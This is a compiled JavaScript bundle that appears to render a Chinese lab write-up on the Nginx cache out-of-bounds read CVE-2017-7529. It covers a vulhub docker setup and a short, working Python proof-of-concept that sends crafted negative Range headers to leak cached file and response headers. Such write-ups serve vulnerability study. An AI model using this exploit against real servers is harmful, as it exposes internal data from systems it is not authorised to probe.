(window.webpackJsonp=window.webpackJsonp||[]).push([[360],{1984:function(s,t,a){s.exports=a.p+"assets/img/image-20220307133726141.22e18a4a.png"},1985:function(s,t,a){s.exports=a.p+"assets/img/318085cd-8491-4ca4-b19e-de8f66041c6b.a68f6b79.png"},2427:function(s,t,a){"use strict";a.r(t);var n=a(75),e=Object(n.a)({},(function(){var s=this,t=s.$createElement,n=s._self._c||t;return n("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[n("h1",{attrs:{id:"nginx越界读取缓存漏洞-cve-2017-7529"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#nginx越界读取缓存漏洞-cve-2017-7529"}},[s._v("#")]),s._v(" Nginx越界读取缓存漏洞 CVE-2017-7529")]),s._v(" "),n("h2",{attrs:{id:"漏洞描述"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[s._v("#")]),s._v(" 漏洞描述")]),s._v(" "),n("p",[s._v("Nginx在反向代理站点的时候，通常会将一些文件进行缓存，特别是静态文件。缓存的部分存储在文件中，每个缓存文件包括“文件头”+“HTTP返回包头”+“HTTP返回包体”。如果二次请求命中了该缓存文件，则Nginx会直接将该文件中的“HTTP返回包体”返回给用户。")]),s._v(" "),n("p",[s._v("如果我的请求中包含Range头，Nginx将会根据我指定的start和end位置，返回指定长度的内容。而如果我构造了两个负的位置，如(-600, -9223372036854774591)，将可能读取到负位置的数据。如果这次请求又命中了缓存文件，则可能就可以读取到缓存文件中位于“HTTP返回包体”前的“文件头”、“HTTP返回包头”等内容。")]),s._v(" "),n("h2",{attrs:{id:"影响版本"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#影响版本"}},[s._v("#")]),s._v(" 影响版本")]),s._v(" "),n("a-checkbox",{attrs:{checked:""}},[s._v("Nginx version 0.5.6 - 1.13.2")]),n("br"),s._v(" "),n("h2",{attrs:{id:"环境搭建"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#环境搭建"}},[s._v("#")]),s._v(" 环境搭建")]),s._v(" "),n("div",{staticClass:"language-shell line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-shell"}},[n("code",[n("span",{pre:!0,attrs:{class:"token function"}},[s._v("git")]),s._v(" clone https://github.com/vulhub/vulhub.git\n"),n("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("cd")]),s._v(" vulhub/nginx/CVE-2017-7529\n"),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("docker-compose")]),s._v(" up -d\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br"),n("span",{staticClass:"line-number"},[s._v("3")]),n("br")])]),n("p",[s._v("访问"),n("code",[s._v("http://xxx.xxx.xxx.xxx:8080")]),s._v(" 正常即可")]),s._v(" "),n("p",[n("img",{attrs:{src:a(1984),alt:"image-20220307133726141"}})]),s._v(" "),n("h2",{attrs:{id:"漏洞复现"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[s._v("#")]),s._v(" 漏洞复现")]),s._v(" "),n("p",[s._v("使用POC进行验证")]),s._v(" "),n("div",{staticClass:"language-shell line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-shell"}},[n("code",[s._v("python poc.py http://xxx.xxx.xxx.xxx:8080/\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br")])]),n("p",[n("img",{attrs:{src:a(1985),alt:"318085cd-8491-4ca4-b19e-de8f66041c6b"}})]),s._v(" "),n("h2",{attrs:{id:"漏洞poc"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#漏洞poc"}},[s._v("#")]),s._v(" 漏洞POC")]),s._v(" "),n("div",{staticClass:"language-python line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-python"}},[n("code",[n("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#!/usr/bin/env python")]),s._v("\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("import")]),s._v(" sys\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("import")]),s._v(" requests\n\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("if")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("len")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("sys"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("argv"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n    "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("print")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"%s url"')]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("sys"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("argv"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n    "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("print")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"eg: python %s http://your-ip:8080/"')]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("sys"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("argv"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n    sys"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("exit"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n\nheaders "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n    "),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'User-Agent'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240"')]),s._v("\n"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\noffset "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("605")]),s._v("\nurl "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" sys"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("argv"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\nfile_len "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("len")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("requests"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("get"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("url"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" headers"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("headers"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("content"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nn "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" file_len "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" offset\nheaders"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'Range'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"bytes=-%d,-%d"')]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("\n    n"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x8000000000000000")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v(" n"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n\nr "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" requests"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("get"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("url"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" headers"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("headers"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br"),n("span",{staticClass:"line-number"},[s._v("3")]),n("br"),n("span",{staticClass:"line-number"},[s._v("4")]),n("br"),n("span",{staticClass:"line-number"},[s._v("5")]),n("br"),n("span",{staticClass:"line-number"},[s._v("6")]),n("br"),n("span",{staticClass:"line-number"},[s._v("7")]),n("br"),n("span",{staticClass:"line-number"},[s._v("8")]),n("br"),n("span",{staticClass:"line-number"},[s._v("9")]),n("br"),n("span",{staticClass:"line-number"},[s._v("10")]),n("br"),n("span",{staticClass:"line-number"},[s._v("11")]),n("br"),n("span",{staticClass:"line-number"},[s._v("12")]),n("br"),n("span",{staticClass:"line-number"},[s._v("13")]),n("br"),n("span",{staticClass:"line-number"},[s._v("14")]),n("br"),n("span",{staticClass:"line-number"},[s._v("15")]),n("br"),n("span",{staticClass:"line-number"},[s._v("16")]),n("br"),n("span",{staticClass:"line-number"},[s._v("17")]),n("br"),n("span",{staticClass:"line-number"},[s._v("18")]),n("br"),n("span",{staticClass:"line-number"},[s._v("19")]),n("br"),n("span",{staticClass:"line-number"},[s._v("20")]),n("br")])])],1)}),[],!1,null,null,null);t.default=e.exports}}]);